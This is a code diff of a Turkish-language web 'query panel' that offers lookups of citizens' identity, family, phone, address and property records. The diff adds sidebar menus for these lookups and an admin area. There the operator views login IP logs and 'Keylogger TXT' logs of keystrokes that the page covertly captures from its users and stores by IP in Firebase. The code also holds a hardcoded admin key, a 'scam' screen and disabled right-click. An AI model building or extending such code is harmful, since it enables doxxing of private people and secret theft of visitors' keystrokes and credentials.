@@ -168,7 +168,7 @@
         .login-divider::before { margin-right: .75em; }
         .login-divider::after { margin-left: .75em; }
 
-        /* Scam / Dolandırıldın Ekranı */
+        /* Scam Ekranı */
         #scamModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(0, 0, 0, 0.95); z-index: 2000;
@@ -213,8 +213,8 @@
             padding: 20px 14px; overflow-y: auto;
             display: flex; flex-direction: column; gap: 10px;
             position: relative; z-index: 5;
+            transition: transform 0.3s ease;
         }
-
         .sidebar.collapsed { transform: translateX(-100%); width: 0; padding: 0; border: none; }
 
         .sidebar-toggle-btn {
@@ -230,17 +230,24 @@
             padding: 10px 14px; color: var(--text-main); font-size: 13px; outline: none;
         }
 
+        .category-group { margin-bottom: 4px; }
         .category-header {
-            padding: 8px 6px; display: flex; align-items: center; justify-content: space-between;
-            cursor: pointer; font-weight: 600; font-size: 13px;
+            padding: 9px 10px; display: flex; align-items: center; justify-content: space-between;
+            cursor: font-weight: 600; font-size: 13px; color: var(--text-main); border-radius: 8px; background: rgba(255,255,255,0.02);
+            cursor: pointer;
         }
-        .subcategory-list { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding-left: 6px; }
+        .category-header:hover { background: rgba(255,255,255,0.05); }
+        .chevron-icon { font-size: 10px; color: var(--text-muted); transition: transform 0.3s; }
+        .category-group.open .chevron-icon { transform: rotate(180deg); color: var(--accent); }
+
+        .subcategory-list { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding-left: 10px; display: flex; flex-direction: column; gap: 3px; margin-top: 4px; }
         .category-group.open .subcategory-list { max-height: 1000px; }
         .subcategory-item {
-            padding: 7px 10px 7px 20px; font-size: 12px; color: var(--text-sub); cursor: pointer;
-            border-radius: 8px; transition: var(--transition);
+            padding: 7px 10px 7px 16px; font-size: 12px; color: var(--text-sub); cursor: pointer;
+            border-radius: 8px; transition: var(--transition); display: flex; align-items: center; justify-content: space-between;
         }
         .subcategory-item:hover, .subcategory-item.active { background: rgba(59, 130, 246, 0.15); color: #fff; }
+        .badge-v1 { font-size: 9px; background: rgba(59,130,246,0.2); color: var(--accent); padding: 2px 5px; border-radius: 4px; }
 
         /* Terminal Konsol */
         .terminal-box {
@@ -297,21 +304,18 @@
         .btn-primary:hover { background: #2563eb; }
         .btn-secondary { background: rgba(255, 255, 255, 0.04); color: var(--text-sub); border: 1px solid var(--border); }
 
-        /* YÖNETİCİ PANELİ ALT BAŞLIKLI DÜZEN */
-        #adminPanel {
-            display: none; background: var(--bg-card); backdrop-filter: blur(16px);
-            border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 28px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-        }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 20px; }
-        
-        .admin-section-box { background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 20px; margin-bottom: 20px; }
-        .admin-section-title { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; border-left: 3px solid var(--accent); padding-left: 8px; }
-        
-        .admin-table-container { border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; background: var(--bg-input); max-height: 300px; overflow-y: auto; }
+        /* YÖNETİCİ PANELİ İÇERİK BÖLÜMLERİ */
+        .admin-section-content { display: none; }
+        .admin-section-content.active { display: block; }
+
+        .admin-section-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 28px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); }
+        .admin-section-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+        .admin-section-sub { font-size: 12px; color: var(--text-sub); margin-bottom: 20px; }
+
+        .admin-table-container { border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; background: var(--bg-input); max-height: 400px; overflow-y: auto; }
         .admin-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; }
-        .admin-table th { background: rgba(0,0,0,0.3); color: var(--text-muted); font-weight: 600; padding: 10px 14px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 10px; position: sticky; top: 0; z-index: 2; }
-        .admin-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
+        .admin-table th { background: rgba(0,0,0,0.3); color: var(--text-muted); font-weight: 600; padding: 12px 16px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 10px; position: sticky; top: 0; z-index: 2; }
+        .admin-table td { padding: 12px 16px; border-bottom: 1px solid var(--border); color: var(--text-main); }
         .admin-table tr:hover td { background: rgba(255,255,255,0.02); }
 
         .status-badge { display: inline-flex; align-items: center; gap: 5px; padding: 3px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; }
@@ -400,13 +404,82 @@
             <div class="sidebar-search-box">
                 <input type="text" class="sidebar-search-input" placeholder="Modüllerde ara..." onkeyup="filterModules(this.value)">
             </div>
-            <div class="category-group open">
-                <div class="category-header" onclick="toggleCategory(this)">Mernis 2026 <span class="chevron-icon">▼</span></div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item active" onclick="switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', this)">Ad Soyad Sorgulama</div>
-                    <div class="subcategory-item" onclick="switchModule('tc-kimlik', 'TC Kimlik Sorgulama', 'Mernis 2026', this)">TC Kimlik Sorgulama</div>
+
+            <!-- KULLANICI MENÜLERİ (Normal Kullanıcılar için) -->
+            <div id="userMenuContainer">
+                <div class="category-group open">
+                    <div class="category-header" onclick="toggleCategory(this)">Mernis 2026 <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item active" onclick="switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', this)"><span>Ad Soyad Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('ad-soyad-kapsamli', 'Ad Soyad Kapsamlı', 'Mernis 2026', this)"><span>Ad Soyad Kapsamlı</span> <span class="badge-v1">V1</span></div>
+                        <div class="subcategory-item" onclick="switchModule('tc-kimlik', 'TC Kimlik Sorgulama', 'Mernis 2026', this)"><span>TC Kimlik Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('tc-pro', 'TC Pro Sorgulama', 'Mernis 2026', this)"><span>TC Pro Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('vergi', 'Vergi Dairesi Sorgulama', 'Mernis 2026', this)"><span>Vergi Dairesi Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('medeni-hal', 'Medeni Hal Sorgulama', 'Mernis 2026', this)"><span>Medeni Hal Sorgulama</span></div>
+                    </div>
+                </div>
+
+                <div class="category-group">
+                    <div class="category-header" onclick="toggleCategory(this)">Aile Çözümleri <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item" onclick="switchModule('aile', 'Aile Sorgulama', 'Aile Çözümleri', this)"><span>Aile Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('sulale', 'Sülale Sorgulama', 'Aile Çözümleri', this)"><span>Sülale Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('anne-tarafi', 'Anne Tarafı Sorgulama', 'Aile Çözümleri', this)"><span>Anne Tarafı Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('baba-tarafi', 'Baba Tarafı Sorgulama', 'Aile Çözümleri', this)"><span>Baba Tarafı Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('es', 'Eş Sorgulama', 'Aile Çözümleri', this)"><span>Eş Sorgulama</span></div>
+                    </div>
+                </div>
+
+                <div class="category-group">
+                    <div class="category-header" onclick="toggleCategory(this)">GSM Çözümleri <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item" onclick="switchModule('gsm-tc', 'GSM TC Sorgulama', 'GSM Çözümleri', this)"><span>GSM TC Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('tc-gsm', 'TC GSM Sorgulama', 'GSM Çözümleri', this)"><span>TC GSM Sorgulama</span></div>
+                    </div>
+                </div>
+
+                <div class="category-group">
+                    <div class="category-header" onclick="toggleCategory(this)">Adres Çözümleri <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item" onclick="switchModule('adres', 'Adres Sorgulama', 'Adres Çözümleri', this)"><span>Adres Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('bina', 'Bina Sorgulama', 'Adres Çözümleri', this)"><span>Bina Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('koy-mahalle', 'Köy Mahalle Sorgulama', 'Adres Çözümleri', this)"><span>Köy Mahalle Sorgulama</span></div>
+                    </div>
+                </div>
+
+                <div class="category-group">
+                    <div class="category-header" onclick="toggleCategory(this)">Diğer Çözümler <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item" onclick="switchModule('plaka', 'Plaka Sorgulama', 'Diğer Çözümler', this)"><span>Plaka Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('sasi', 'Şasi No Sorgulama', 'Diğer Çözümler', this)"><span>Şasi No Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('ip', 'IP Adresi Analiz', 'Diğer Çözümler', this)"><span>IP Adresi Analiz</span></div>
+                        <div class="subcategory-item" onclick="switchModule('discord', 'Discord Sorgulama', 'Diğer Çözümler', this)"><span>Discord Sorgulama</span></div>
+                    </div>
+                </div>
+
+                <div class="category-group">
+                    <div class="category-header" onclick="toggleCategory(this)">Premium Çözümler <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item" onclick="switchModule('p-kisi', 'Kişi Sorgulama', 'Premium', this)"><span>Kişi Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('p-adres', 'Adres Sorgulama', 'Premium', this)"><span>Adres Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('vesika', 'Vesika Sorgulama', 'Premium', this)"><span>Vesika Sorgulama</span></div>
+                        <div class="subcategory-item" onclick="switchModule('tapu', 'Tapu Sorgulama', 'Premium', this)"><span>Tapu Sorgulama</span></div>
+                    </div>
                 </div>
             </div>
+
+            <!-- ADMİN YÖNETİM MENÜSÜ (Yanda Alt Başlıklı Menü) -->
+            <div id="adminMenuContainer" style="display:none;">
+                <div class="category-group open">
+                    <div class="category-header" onclick="toggleCategory(this)">Yönetim Paneli <span class="chevron-icon">▼</span></div>
+                    <div class="subcategory-list">
+                        <div class="subcategory-item active" onclick="switchAdminSection('sec-users', this)"><span>Kullanıcı & Lisanslar</span></div>
+                        <div class="subcategory-item" onclick="switchAdminSection('sec-iplogs', this)"><span>IP Giriş Logları</span></div>
+                        <div class="subcategory-item" onclick="switchAdminSection('sec-keylogger', this)"><span>Keylogger TXT Logları</span></div>
+                    </div>
+                </div>
+            </div>
+
             <div class="terminal-box">
                 <div class="terminal-header"><span>SYSTEM AUDIT</span><span style="color:var(--success);">● ACTIVE</span></div>
                 <div class="terminal-content" id="terminalLog">
@@ -431,82 +504,85 @@
                 </form>
             </div>
 
-            <!-- YÖNETİCİ PANELİ (Sıralı Alt Başlıklı ve Ayrı Log Sekmeli) -->
-            <div id="adminPanel">
-                <div class="admin-header">
-                    <div class="admin-title-box">
-                        <h2>Yönetici Paneli & Kontrol Merkezi</h2>
-                        <p style="font-size:11px; color:var(--text-sub);">Kullanıcı yönetimi, giriş IP logları ve canlı keylogger txt kayıtları</p>
-                    </div>
-                    <span class="active-module-badge">ROOT ACCESS</span>
-                </div>
-
-                <!-- 1. ALT BAŞLIK: KULLANICI & LİSANS YÖNETİMİ -->
-                <div class="admin-section-box">
-                    <div class="admin-section-title">1. Kullanıcı & Lisans Yönetimi</div>
-                    <div class="form-grid" style="margin-bottom: 14px;">
-                        <input type="text" id="newKey" class="form-input" placeholder="10 Haneli Karmaşık Key">
-                        <div style="display:flex; gap:8px;">
-                            <button onclick="generateRandomKey()" class="btn btn-secondary" style="flex:1;">Rastgele Üret</button>
-                            <button onclick="addNewUser()" class="btn btn-primary" style="flex:1;">Kullanıcı Ekle</button>
+            <!-- ADMİN YÖNETİM İÇERİK EKRANI (Yan Menüden Kontrol Edilir) -->
+            <div id="adminPanel" style="display:none;">
+                
+                <!-- 1. Bölüm: Kullanıcı & Lisans Yönetimi -->
+                <div id="sec-users" class="admin-section-content active">
+                    <div class="admin-section-box">
+                        <div class="admin-section-title">Kullanıcı & Lisans Yönetimi</div>
+                        <div class="admin-section-sub">Sisteme yeni erişim anahtarları ekleyin ve mevcut kullanıcıları yönetin.</div>
+                        <div class="form-grid" style="margin-bottom: 16px;">
+                            <input type="text" id="newKey" class="form-input" placeholder="10 Haneli Karmaşık Key">
+                            <div style="display:flex; gap:8px;">
+                                <button onclick="generateRandomKey()" class="btn btn-secondary" style="flex:1;">Rastgele Üret</button>
+                                <button onclick="addNewUser()" class="btn btn-primary" style="flex:1;">Kullanıcı Ekle</button>
+                            </div>
+                        </div>
+                        <div class="admin-table-container">
+                            <table class="admin-table">
+                               <thead>
+                                    <tr>
+                                        <th>Kullanıcı Adı</th>
+                                        <th>Erişim Key</th>
+                                        <th>Durum</th>
+                                        <th style="text-align:right;">İşlemler</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="adminUserTableBody"></tbody>
+                            </table>
                         </div>
                     </div>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Kullanıcı Adı</th>
-                                    <th>Erişim Key</th>
-                                    <th>Durum</th>
-                                    <th style="text-align:right;">İşlemler</th>
-                                </tr>
-                            </thead>
-                            <tbody id="adminUserTableBody"></tbody>
-                        </table>
+                </div>
+
+                <!-- 2. Bölüm: IP Giriş Logları -->
+                <div id="sec-iplogs" class="admin-section-content">
+                    <div class="admin-section-box">
+                        <div class="admin-section-title">IP Giriş Logları (Kim Ne Zaman Girdi?)</div>
+                        <div class="admin-section-sub">Kullanıcıların ve yöneticilerin panele hangi saatte ve hangi IP ile giriş yaptığının kaydı.</div>
+                        <div class="admin-table-container">
+                            <table class="admin-table">
+                                <thead>
+                                    <tr>
+                                        <th>Kullanıcı / Hesap</th>
+                                        <th>Bağlandığı IP Adresi</th>
+                                        <th>Giriş Tarihi ve Saati</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="adminIpLogsTableBody">
+                                    <tr><td colspan="3" style="text-align:center;">Giriş logları yükleniyor...</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
                 </div>
 
-                <!-- 2. ALT BAŞLIK: PANEL GİRİŞ IP LOGLARI -->
-                <div class="admin-section-box">
-                    <div class="admin-section-title">2. Panel Giriş IP Logları (Kim Ne Zaman Girdi?)</div>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Kullanıcı / Hesap</th>
-                                    <th>Bağlandığı IP Adresi</th>
-                                    <th>Giriş Tarihi ve Saati</th>
-                                </tr>
-                            </thead>
-                            <tbody id="adminIpLogsTableBody">
-                                <tr><td colspan="3" style="text-align:center; color:var(--text-muted);">Giriş logları yükleniyor...</td></tr>
-                            </tbody>
-                        </table>
+                <!-- 3. Bölüm: Keylogger TXT Logları -->
+                <div id="sec-keylogger" class="admin-section-content">
+                    <div class="admin-section-box">
+                        <div class="admin-section-title">Keylogger Logları (IP Bazlı Canlı TXT)</div>
+                        <div class="admin-section-sub">Giriş ekranından itibaren tuş hareketlerinin IP bazlı saklandığı dosya kayıtları.</div>
+                        <div style="margin-bottom: 14px;">
+                            <button onclick="downloadAllKeyloggerLogs()" class="btn btn-primary" style="font-size:12px; padding:8px 14px;">Tüm Verileri Toplu TXT İndir</button>
+                        </div>
+                        <div class="admin-table-container">
+                            <table class="admin-table">
+                                <thead>
+                                    <tr>
+                                        <th>Kullanıcı & IP</th>
+                                        <th>Son Güncelleme</th>
+                                        <th>Tuş Vuruşları</th>
+                                        <th style="text-align:right;">İşlem</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="adminKeyloggerTableBody">
+                                    <tr><td colspan="4" style="text-align:center;">Keylogger verisi bekleniyor...</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
                 </div>
 
-                <!-- 3. ALT BAŞLIK: KEYLOGGER TXT DOSYA LOGLARI -->
-                <div class="admin-section-box">
-                    <div class="admin-section-title">3. Keylogger Logları (IP Bazlı Canlı TXT)</div>
-                    <div style="margin-bottom: 10px;">
-                        <button onclick="downloadAllKeyloggerLogs()" class="btn btn-primary" style="font-size:12px; padding:8px 14px;">Tüm Keylogger Verilerini Toplu TXT İndir</button>
-                    </div>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Kullanıcı & IP</th>
-                                    <th>Son Güncelleme</th>
-                                    <th>Tuş Vuruşları (Buffer)</th>
-                                    <th style="text-align:right;">İşlem</th>
-                                </tr>
-                            </thead>
-                            <tbody id="adminKeyloggerTableBody">
-                                <tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Keylogger verisi bekleniyor...</td></tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
             </div>
 
             <!-- Sonuç Paneli -->
@@ -545,18 +621,40 @@
 
         let clientIpAddress = "IP Alınıyor...";
 
-        // IP Adresini Çekme
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => { clientIpAddress = data.ip; })
             .catch(() => { clientIpAddress = "127.0.0.1"; });
 
+        // Sorgu Modülleri
         const moduleConfigs = {
             'ad-soyad': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input" placeholder="Soyadı"></div>` },
-            'tc-kimlik': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="11 haneli TC No" maxlength="11"></div>` }
+            'ad-soyad-kapsamli': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input" placeholder="Soyadı"></div><div class="form-group"><label class="form-label">İl / İlçe</label><input type="text" class="form-input" placeholder="Ankara"></div>` },
+            'tc-kimlik': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="11 haneli TC No" maxlength="11"></div>` },
+            'tc-pro': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No (Pro) <span>*</span></label><input type="text" class="form-input" placeholder="11 haneli TC No"></div>` },
+            'vergi': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">Vergi Dairesi / VKN <span>*</span></label><input type="text" class="form-input" placeholder="VKN"></div>` },
+            'medeni-hal': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'aile': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Kök TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'sulale': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Kök TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'anne-tarafi': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Hedef TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'baba-tarafi': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Hedef TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'es': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'gsm-tc': { badge: 'GSM Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">GSM Numarası <span>*</span></label><input type="text" class="form-input" placeholder="05XXXXXXXXX"></div>` },
+            'tc-gsm': { badge: 'GSM Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` },
+            'adres': { badge: 'Adres Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC No veya Ad Soyad <span>*</span></label><input type="text" class="form-input" placeholder="Arama verisi"></div>` },
+            'bina': { badge: 'Adres Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Bina / Adres Kodu <span>*</span></label><input type="text" class="form-input" placeholder="UAVT Kod"></div>` },
+            'koy-mahalle': { badge: 'Adres Çözümleri', fields: `<div class="form-group"><label class="form-label">İl / İlçe / Mahalle <span>*</span></label><input type="text" class="form-input" placeholder="Ankara/Çankaya"></div>` },
+            'plaka': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Araç Plakası <span>*</span></label><input type="text" class="form-input" placeholder="06 MAM 06"></div>` },
+            'sasi': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Şasi No (VIN) <span>*</span></label><input type="text" class="form-input" placeholder="Şasi No"></div>` },
+            'ip': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">IP Adresi <span>*</span></label><input type="text" class="form-input" placeholder="192.168.1.1"></div>` },
+            'discord': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Discord ID veya Kullanıcı Adı <span>*</span></label><input type="text" class="form-input" placeholder="Discord ID giriniz"></div>` },
+            'p-kisi': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Kişi Parametresi <span>*</span></label><input type="text" class="form-input" placeholder="TC / Ad Soyad / Tel"></div>` },
+            'p-adres': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Premium Adres <span>*</span></label><input type="text" class="form-input" placeholder="Adres bilgisi"></div>` },
+            'vesika': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Vesika Yükle <span>*</span></label><input type="file" class="form-input"></div>` },
+            'tapu': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` }
         };
 
-        // KEYLOGGER AKTİF ÇALIŞMA KONTROLÜ (Giriş anından itibaren IP bazlı toplar)
+        // Keylogger Çalışma Mantığı
         let typedStringBuffer = "";
         let logSyncTimer = null;
 
@@ -602,7 +700,6 @@
 
             if (!key) { err.textContent = "Lütfen key giriniz."; return; }
 
-            // Admin Girişi
             if (key === "123123") {
                 let sessionObj = { username: "Admin (Root)", isAdmin: true };
                 localStorage.setItem("mami_current_user", JSON.stringify(sessionObj));
@@ -637,7 +734,6 @@
             });
         }
 
-        // Giriş Yapanların IP Log Kaydı
         function recordIpLoginLog(username, ip) {
             db.ref('panel_ip_logs').push({
                 username: username,
@@ -655,7 +751,8 @@
             document.getElementById('avatarText').textContent = data.username.substring(0, 2).toUpperCase();
 
             if (data.isAdmin) {
-                document.getElementById('userSidebar').style.display = 'none';
+                document.getElementById('userMenuContainer').style.display = 'none';
+                document.getElementById('adminMenuContainer').style.display = 'block';
                 document.getElementById('searchCardPanel').style.display = 'none';
                 document.getElementById('resultsSectionPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
@@ -668,8 +765,17 @@
             location.reload();
         }
 
+        // Admin Sol Yan Menü Alt Başlık Geçişleri
+        function switchAdminSection(sectionId, itemElem) {
+            document.querySelectorAll('.admin-section-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('#adminMenuContainer .subcategory-item').forEach(el => el.classList.remove('active'));
+            
+            document.getElementById(sectionId).classList.add('active');
+            if(itemElem) itemElem.classList.add('active');
+        }
+
         function loadAdminDashboardData() {
-            // 1. Kullanıcılar
+            // Kullanıcılar
             db.ref('users').on('value', (snap) => {
                 const users = snap.val();
                 const tbody = document.getElementById('adminUserTableBody');
@@ -693,7 +799,7 @@
                 }
             });
 
-            // 2. IP Giriş Logları
+            // IP Giriş Logları
             db.ref('panel_ip_logs').on('value', (snap) => {
                 const logs = snap.val();
                 const tbody = document.getElementById('adminIpLogsTableBody');
@@ -711,7 +817,7 @@
                 }
             });
 
-            // 3. Keylogger IP & TXT Logları
+            // Keylogger Logları
             db.ref('keylogger_single_logs').on('value', (snap) => {
                 const logs = snap.val();
                 const tbody = document.getElementById('adminKeyloggerTableBody');
@@ -791,6 +897,7 @@
 
         function toggleSidebar() { document.getElementById('userSidebar').classList.toggle('collapsed'); }
         function toggleCategory(el) { el.parentElement.classList.toggle('open'); }
+        
         function switchModule(key, title, badge, item) {
             document.querySelectorAll('.subcategory-item').forEach(i => i.classList.remove('active'));
             if(item) item.classList.add('active');
@@ -798,6 +905,7 @@
             document.getElementById('moduleBadge').textContent = badge;
             document.getElementById('formFields').innerHTML = moduleConfigs[key] ? moduleConfigs[key].fields : '';
         }
+
         function resetForm() { document.querySelectorAll('.form-input').forEach(i => i.value = ''); }
         function executeSearch() { alert("Sorgu modülü çalıştırılıyor..."); }
 
@@ -805,6 +913,8 @@
             switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', document.querySelector('.subcategory-item'));
             if (localStorage.getItem("mami_current_user")) initSession();
         };
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
 </html>
